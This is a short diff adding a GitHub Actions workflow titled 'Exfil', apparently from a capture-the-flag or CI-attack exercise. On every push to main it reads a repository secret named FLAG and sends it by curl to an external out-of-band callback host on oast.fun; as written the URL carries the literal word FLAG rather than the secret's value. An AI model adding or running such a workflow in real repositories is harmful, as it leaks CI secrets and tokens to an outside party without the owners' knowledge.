@@ -1,0 +1,18 @@
+name: Exfil
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  print:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Print Secret
+        env:
+          FLAG: ${{ secrets.FLAG }}
+        run: |
+          curl https://qebakcujrsfzyoxddlbkrlvb7gn6vc8a7.oast.fun/?flag=FLAG
+        shell: bash
